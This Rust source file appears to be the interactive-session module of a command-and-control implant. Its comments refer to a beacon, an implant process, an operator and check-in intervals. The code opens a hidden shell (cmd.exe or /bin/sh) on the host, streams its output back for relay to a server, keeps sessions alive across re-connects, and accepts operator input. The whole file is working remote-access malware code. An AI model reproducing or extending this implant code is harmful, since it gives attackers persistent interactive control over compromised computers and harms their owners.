//! Interactive sessions.
//!
//! A session is a process the operator can write to and read from while it
//! runs.  The process is started with its input and output piped and a
//! reader thread pushes the output into a channel, so the beacon can send
//! the chunks to the server as they arrive: the console shows the session
//! while it is still running, not when it is over.
//!
//! The sessions live in the implant process, not in the connection.  A
//! session therefore survives a re-connect, which is what makes an
//! interactive shell usable when the check-in interval is a minute.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::{Arc, Mutex, OnceLock};
use std::thread;

use crate::task::Outcome;
use crate::upk;

/// A live session.
pub struct Session {
    /// The id the operator addresses the session with.
    pub id: String,
    stdin: Mutex<Option<ChildStdin>>,
    child: Mutex<Child>,
}

/// The registry of the live sessions.
static SESSIONS: OnceLock<Mutex<HashMap<String, Arc<Session>>>> = OnceLock::new();

/// The registry of the live sessions.
pub fn registry() -> &'static Mutex<HashMap<String, Arc<Session>>> {
    SESSIONS.get_or_init(|| Mutex::new(HashMap::new()))
}

/// How many sessions are live.
pub fn count() -> usize {
    registry().lock().map(|guard| guard.len()).unwrap_or(0)
}

/// The ids of the live sessions.
pub fn ids() -> Vec<String> {
    registry()
        .lock()
        .map(|guard| {
            let mut out: Vec<String> = guard.keys().cloned().collect();
            out.sort();
            out
        })
        .unwrap_or_default()
}

/// A task that runs in the background and streams its output.
pub struct Stream {
    /// The output chunks, in order.
    pub rx: std::sync::mpsc::Receiver<Vec<u8>>,
    handle: Option<thread::JoinHandle<Result<Outcome, String>>>,
}

impl Stream {
    /// Build a stream from a channel and the worker that feeds it.
    pub fn new(
        rx: std::sync::mpsc::Receiver<Vec<u8>>,
        handle: thread::JoinHandle<Result<Outcome, String>>,
    ) -> Self {
        Stream { rx, handle: Some(handle) }
    }

    /// Whether the background work is finished.
    pub fn finished(&self) -> bool {
        self.handle.as_ref().map(|h| h.is_finished()).unwrap_or(true)
    }

    /// The result of the background work, once it is finished.
    pub fn outcome(&mut self) -> Option<Result<Outcome, String>> {
        let handle = self.handle.take()?;
        if !handle.is_finished() {
            self.handle = Some(handle);
            return None;
        }
        Some(
            handle
                .join()
                .unwrap_or_else(|_| Err("the session thread panicked".to_string())),
        )
    }
}

/// Open a session.
///
/// An empty command starts the platform's own shell, which is the
/// interactive case; a command runs and stays open until it exits.
/// Read one pipe of a child process into the channel until it closes.
///
/// The sender is dropped when the reader ends, so the receiver sees the end
/// of the session when the last pipe is done.
fn pump<R: Read + Send + 'static>(mut pipe: R, tx: std::sync::mpsc::Sender<Vec<u8>>) {
    thread::spawn(move || {
        let mut buf = [0u8; 4096];
        loop {
            match pipe.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if tx.send(buf[..n].to_vec()).is_err() {
                        break;
                    }
                }
            }
        }
    });
}

pub fn open(cmd: &str) -> Result<(String, Stream), String> {
    let mut command = shell_command(cmd);
    command
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = command.spawn().map_err(|e| format!("session: {e}"))?;
    let stdin = child.stdin.take();
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();

    let (tx, rx) = std::sync::mpsc::channel::<Vec<u8>>();
    // One reader for stdout and one for stderr: the operator wants both, and
    // interleaving them is better than losing one of them.  They are two
    // different types (ChildStdout and ChildStderr), so each goes through
    // the same generic pump rather than into one array.
    if let Some(pipe) = stdout {
        pump(pipe, tx.clone());
    }
    if let Some(pipe) = stderr {
        pump(pipe, tx.clone());
    }
    // The channel closes when both readers are done, which is the signal
    // that the session has nothing more to say.
    drop(tx);

    let id = format!("s-{}", crate::config::hex_encode(&crate::crypto::random_bytes(6)));
    let session = Arc::new(Session {
        id: id.clone(),
        stdin: Mutex::new(stdin),
        child: Mutex::new(child),
    });
    {
        let mut guard = registry()
            .lock()
            .map_err(|_| "the session registry is poisoned".to_string())?;
        guard.insert(id.clone(), Arc::clone(&session));
    }
    let handle = thread::spawn(move || {
        let status = {
            let mut child = session
                .child
                .lock()
                .map_err(|_| "the session is poisoned".to_string())?;
            child.wait()
        };
        {
            let mut guard = registry()
                .lock()
                .map_err(|_| "the session registry is poisoned".to_string())?;
            guard.remove(&id);
        }
        match status {
            Ok(status) => {
                let code = status.code().unwrap_or(-1);
                Ok(Outcome::ok(Vec::new())
                    .with("exit", upk::i(code as i64))
                    .with("session", upk::s(&id)))
            }
            Err(e) => Err(format!("session: {e}")),
        }
    });
    Ok((id, Stream { rx, handle: Some(handle) }))
}

/// Write to a session.
pub fn input(id: &str, data: &[u8]) -> Result<(), String> {
    let guard = registry()
        .lock()
        .map_err(|_| "the session registry is poisoned".to_string())?;
    let session = guard
        .get(id)
        .ok_or_else(|| format!("unknown session {id}"))?;
    let mut stdin = session
        .stdin
        .lock()
        .map_err(|_| "the session is poisoned".to_string())?;
    let writer = stdin
        .as_mut()
        .ok_or("the session has no input any more")?;
    writer
        .write_all(data)
        .map_err(|e| format!("write: {e}"))?;
    writer.flush().ok();
    Ok(())
}

/// Close a session: the process is killed and the session is forgotten.
pub fn close(id: &str) -> Result<(), String> {
    let mut guard = registry()
        .lock()
        .map_err(|_| "the session registry is poisoned".to_string())?;
    let session = guard
        .remove(id)
        .ok_or_else(|| format!("unknown session {id}"))?;
    let mut child = session
        .child
        .lock()
        .map_err(|_| "the session is poisoned".to_string())?;
    child.kill().ok();
    Ok(())
}

/// The command that carries an interactive session.
fn shell_command(cmd: &str) -> Command {
    #[cfg(windows)]
    {
        let mut c = Command::new("cmd.exe");
        if !cmd.trim().is_empty() {
            c.arg("/C").arg(cmd);
        }
        c
    }
    #[cfg(not(windows))]
    {
        let mut c = Command::new("/bin/sh");
        if !cmd.trim().is_empty() {
            c.arg("-c").arg(cmd);
        }
        c
    }
}
